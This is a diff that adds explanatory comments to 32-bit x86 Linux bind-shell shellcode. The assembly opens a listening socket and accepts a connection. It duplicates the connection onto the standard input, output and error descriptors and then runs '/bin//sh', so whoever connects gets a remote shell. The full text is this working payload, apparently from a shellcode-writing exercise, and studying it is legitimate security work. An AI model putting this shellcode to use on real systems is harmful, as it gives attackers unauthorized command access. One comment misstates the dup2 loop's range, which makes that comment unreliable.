@@ -22,7 +22,7 @@ _start:
     push ebx            ; SOCK_STREAM = 1
                         ; Needed for bind(), can be used here to save a few bytes
     push byte 0x2       ; PF_INET = 2
-    mov ecx, esp
+    mov ecx, esp        ; ECX points to args
     int 0x80
 
     xchg esi, eax       ; sockfd is now stored in esi
@@ -39,8 +39,8 @@ _start:
     push byte 0x10      ; sizeof(sockaddr)
     push ecx            ; pointer to sockaddr
     push esi            ; sockfd
-    mov ecx, esp
-    push byte 0x66
+    mov ecx, esp        ; ECX points to args
+    push byte 0x66      ; socketcall()
     pop eax
     int 0x80
 
@@ -51,42 +51,43 @@ _start:
     push esi            ; sockfd stored in esi
     mov ecx, esp        ; ECX points to args
     push byte 0x66      ; socketcall()
-    pop eax
+    pop eax 
     inc ebx
     inc ebx             ; #define SYS_LISTEN	4
     int 0x80
     
     ;
     ; accept(int sockfd, NULL, NULL);
-    ; From man 2 accept: When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
+    ; From man 2 accept: When addr is NULL, nothing is filled in; 
+    ; in this case, addrlen is not used, and should also be NULL.
     ;
-    push edx
-    push edx
-    push esi
+    push edx            ; Push NULL
+    push edx            ; Push NULL
+    push esi            ; Push sockfd
     mov ecx, esp        ; ECX points to args
     inc ebx             ; #define SYS_ACCEPT	5
-    mov al, 0x66
+    mov al, 0x66        ; socketcall()
     int 0x80
     
     ;
     ; dup2(ebx, {0,1,2})
     ;
     xchg ebx, eax       ; EAX = 0x5, EBX = new_sockfd
-    xor ecx, ecx
+    xor ecx, ecx        ; ECX = 0
 lbl:
-    mov al, 0x3f
+    mov al, 0x3f        ; dup2()
     int 0x80
-    inc ecx
-    cmp cl, 0x4
-    jne lbl
+    inc ecx             ; Iterate over {0,1,2}
+    cmp cl, 0x4         ; Are we done?
+    jne lbl             ; Nope
     
     ; execve("/bin//sh", NULL, NULL)
-    push edx
-    push 0x68732f2f
-    push 0x6e69622f
+    push edx            ; Null terminator
+    push 0x68732f2f     ; "hs//"
+    push 0x6e69622f     ; "nib/"
     
-    mov ebx, esp
-    mov ecx, edx
+    mov ebx, esp        ; EBX points to "/bin//sh"
+    mov ecx, edx        ; ECX = NULL
     
-    mov al, 0xb
+    mov al, 0xb         ; execve()
     int 0x80
